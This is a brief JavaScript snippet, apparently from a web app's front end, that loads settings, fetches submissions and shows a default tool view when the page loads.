document.addEventListener('DOMContentLoaded', async () => {
    await loadSettings();
    await fetchAllSubmissions();
    showView('enhancerToolView'); // Show main tool view by default
});